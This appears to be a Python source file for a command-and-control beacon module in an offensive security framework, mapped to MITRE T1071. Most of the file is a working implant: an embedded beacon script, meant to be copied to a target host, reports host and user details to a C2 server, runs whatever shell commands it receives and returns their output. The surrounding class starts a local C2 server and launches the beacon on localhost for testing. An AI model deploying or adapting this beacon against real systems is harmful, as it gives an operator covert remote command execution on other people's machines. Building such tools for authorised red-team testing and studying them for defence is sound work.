"""C2 Beacon module.

Deploys a lightweight Python beacon to the target (or simulates one locally
for testing) that periodically checks in with the APT C2 server, executes any
queued shell commands, and returns the output.

For a real deployment the beacon script (``_BEACON_SCRIPT``) would be copied
to the target host and executed there.  For initial development the module
starts a local beacon thread that connects back to the C2 server running
inside APT itself, which is useful for end-to-end testing without a remote
target.
"""
from __future__ import annotations

import atexit
import subprocess

from modules.base_module import APT_MODULE
from models.target import Target, MESSAGE_TYPE
from models.module_metadata import AttackTactic, TargetOS, TargetArch


# Minimal self-contained beacon script that is executed on the target.
# It is intentionally kept short so it can be delivered via various means.
_BEACON_SCRIPT = """\
import json, os, platform, socket, subprocess, sys, time, urllib.request, uuid

C2_URL = "{c2_url}"
INTERVAL = {interval}
PSK = "{psk}"

def _post(path, data):
    payload = json.dumps(data).encode()
    req = urllib.request.Request(
        C2_URL + path,
        data=payload,
        headers={{"Content-Type": "application/json", "Content-Length": str(len(payload))}},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read().decode())

session_id = str(uuid.uuid4())

while True:
    try:
        checkin = {{
            "type": "checkin",
            "session_id": session_id,
            "hostname": socket.gethostname(),
            "platform": platform.system(),
            "username": os.environ.get("USER", os.environ.get("USERNAME", "")),
            "timestamp": time.time(),
        }}
        resp = _post("/checkin", checkin)
        if resp.get("type") == "task":
            cmd = resp.get("command", "")
            task_id = resp.get("task_id", "")
            try:
                proc = subprocess.run(
                    cmd, shell=True, capture_output=True, timeout=60)
                output = (proc.stdout + proc.stderr).decode("utf-8", errors="replace")
                exit_code = proc.returncode
            except Exception as exc:
                output = str(exc)
                exit_code = -1
            _post("/result", {{
                "type": "result",
                "session_id": session_id,
                "task_id": task_id,
                "output": output,
                "encoding": "utf-8",
                "exit_code": exit_code,
                "timestamp": time.time(),
            }})
    except Exception as exc:
        pass
    time.sleep(INTERVAL)
"""


class beacon(APT_MODULE):
    name = "C2 Beacon"
    description = (
        "Starts a local C2 server within APT and launches a beacon that "
        "checks in periodically.  The beacon can execute shell commands sent "
        "from the Target Details shell tab."
    )
    tactic = AttackTactic.COMMAND_AND_CONTROL
    technique_id = "T1071"
    technique_name = "Application Layer Protocol"
    compatible_os = [TargetOS.ANY]
    compatible_arch = [TargetArch.ANY]
    consumes_variables = []
    produces_variables = ["c2_session", "os_identified"]

    def __init__(self) -> None:
        super().__init__()
        self._c2_server = None
        self._beacon_procs: dict[str, subprocess.Popen] = {}
        self._target_session: dict[str, str] = {}
        self._atexit_registered = False

    def _register_atexit(self) -> None:
        if self._atexit_registered:
            return
        atexit.register(self.shutdown_all)
        self._atexit_registered = True

    def _cleanup_dead_beacons(self) -> None:
        dead_targets = [
            target_key for target_key, proc in self._beacon_procs.items() if proc.poll() is not None
        ]
        for target_key in dead_targets:
            self._beacon_procs.pop(target_key, None)
            self._target_session.pop(target_key, None)

    def action(self, target: Target):
        import flet as ft
        import time
        import sys

        from c2.server import C2Server

        # Capture the Flet page reference while running in a Flet-managed
        # thread.  The C2 server callbacks fire from the HTTP server thread
        # which has no Flet renderer context, so we schedule target mutations
        # back onto a Flet-aware thread via page.run_thread().
        page = ft.context.page
        self._register_atexit()
        self._cleanup_dead_beacons()

        target_key = target.ip_label
        existing_proc = self._beacon_procs.get(target_key)
        if existing_proc is not None and existing_proc.poll() is None:
            target.update_field("beacon_pid", existing_proc.pid)
            target.update_field("beacon_connected", True)
            target.log_activity(
                f"Beacon already running (PID {existing_proc.pid})",
                True,
                MESSAGE_TYPE.INFORMATION,
            )
            return

        c2_port = getattr(target, "beacon_c2_port", 8443)
        interval = getattr(target, "beacon_interval", 10)

        # Start or reuse the C2 server
        if self._c2_server is None or not self._c2_server.is_running:
            def on_checkin(sess):
                def _apply():
                    target.update_field("beacon_session_id", sess.session_id)
                    target.update_field("beacon_last_seen", time.time())
                    target.update_field("beacon_connected", True)
                    if sess.platform:
                        target.update_field("os_guess", sess.platform)
                    self._target_session[target_key] = sess.session_id
                    target.log_activity(
                        f"Beacon check-in from {sess.hostname} ({sess.username}@{sess.platform})",
                        True,
                        MESSAGE_TYPE.SUCCESS,
                    )
                page.run_thread(_apply)

            def on_result(sess, result):
                def _apply():
                    output = result.decoded_output()
                    command = sess.task_commands.get(result.task_id, "").strip()
                    task_label = command if command else result.task_id[:8]
                    msg_type = MESSAGE_TYPE.SUCCESS if result.exit_code == 0 else MESSAGE_TYPE.ERROR
                    target.log_activity(
                        f"Task: {task_label}",
                        message_type=msg_type,
                        details=f"Exit code: {result.exit_code}\n\n{output}",
                    )
                page.run_thread(_apply)

            self._c2_server = C2Server(
                host="127.0.0.1",
                port=c2_port,
                on_checkin=on_checkin,
                on_result=on_result,
            )
            self._c2_server.start()
            target.log_activity(f"C2 server started on 127.0.0.1:{c2_port}", True, MESSAGE_TYPE.INFORMATION)

        c2_url = f"http://127.0.0.1:{c2_port}"
        script = _BEACON_SCRIPT.format(c2_url=c2_url, interval=interval, psk="")

        # Launch beacon as a local subprocess (simulating a local callback)
        try:
            proc = subprocess.Popen(
                [sys.executable, "-c", script],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            self._beacon_procs[target_key] = proc
            target.update_field("beacon_pid", proc.pid)
            target.log_activity(f"Beacon process started (PID {proc.pid})", True, MESSAGE_TYPE.SUCCESS)
        except Exception as exc:
            target.log_activity(f"Failed to start beacon: {exc}", True, MESSAGE_TYPE.ERROR)

    def push_command(self, session_id: str, command: str) -> bool:
        """Queue a shell command for delivery to the beacon on next check-in.

        Returns True if a C2 server is running and the session exists.
        """
        if self._c2_server is None:
            return False
        return self._c2_server.push_command(session_id, command)

    def shutdown(self, target: Target) -> None:
        """Terminate the beacon subprocess and stop the C2 server.

        Safe to call even if the beacon was never started.
        """
        target_key = target.ip_label
        proc = self._beacon_procs.pop(target_key, None)
        self._target_session.pop(target_key, None)

        if proc is not None:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except OSError:
                pass
            target.update_field("beacon_pid", 0)

        self._cleanup_dead_beacons()

        if self._c2_server is not None and not self._beacon_procs:
            self._c2_server.stop()
            self._c2_server = None

        target.update_field("beacon_connected", False)
        target.log_activity("Beacon and C2 server stopped", True, MESSAGE_TYPE.INFORMATION)

    def shutdown_all(self) -> None:
        """Terminate all beacon subprocesses and stop the C2 server."""
        for target_key, proc in list(self._beacon_procs.items()):
            try:
                if proc.poll() is None:
                    proc.terminate()
                    proc.wait(timeout=5)
            except OSError:
                pass
            finally:
                self._beacon_procs.pop(target_key, None)
                self._target_session.pop(target_key, None)

        if self._c2_server is not None:
            self._c2_server.stop()
            self._c2_server = None

    def enable(self, e):
        self.enabled = e
